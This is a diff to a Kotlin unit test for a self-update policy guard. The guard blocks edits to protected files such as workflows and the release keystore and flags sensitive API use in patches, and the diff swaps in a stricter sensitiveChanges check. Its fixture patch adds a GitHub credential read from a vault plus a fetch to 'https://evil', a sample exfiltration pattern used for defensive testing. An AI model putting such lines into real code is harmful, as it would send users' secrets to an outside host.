@@ -19,9 +19,11 @@ class SelfUpdateTest {
                 ".github/workflows/vega-auto.yml", "vegacore/src/../../app/x.kt", "vega/src/main/release.jks", "settings.gradle.kts"))
             assertNotNull(Policy.check(p), p)
         assertTrue(Policy.branchName("Ať je tlačítko Odeslat větší!", 1_700_000_000_000L).matches(GitHub.AUTO_BRANCH))
-        // citlivá API v přidaných řádcích
-        val d = "--- a/x\n+++ b/x\n+val k = vault.read(\"github\")\n+fetch('https://evil')\n+val ok = 1\n-vault old"
-        assertEquals(2, Policy.sensitiveAdditions(d).size)
+        // citlivá API v přidaných řádcích (27. 11.: starší slabší kopie sensitiveAdditions odstraněna – platí jen sensitiveChanges,
+        // která kontroluje i odebrané řádky, „+++“ uvnitř hunku a neviditelné znaky)
+        val d = "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1,3 @@\n+val k = vault.read(\"github\")\n+fetch('https://evil')\n+val ok = 1"
+        val hits = Policy.sensitiveChanges(d)
+        assertEquals(2, hits.size, hits.toString())
     }
 
     @Test fun round15GuardCatchesBypasses() {
